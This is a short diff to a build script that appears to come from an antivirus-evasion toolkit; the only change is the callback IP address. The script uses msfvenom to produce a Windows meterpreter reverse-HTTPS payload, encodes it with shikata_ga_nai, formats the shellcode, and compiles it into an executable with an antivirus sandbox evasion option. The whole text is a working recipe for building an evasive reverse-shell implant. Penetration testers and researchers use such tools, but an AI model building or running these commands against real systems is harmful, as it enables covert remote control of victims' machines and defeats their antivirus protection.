@@ -6,7 +6,7 @@
 . build/global_win32.sh
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.132 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.142 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
 # format the shellcode for make_avet
 ./format.sh sc.txt > scclean.txt && rm sc.txt
 # call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion 
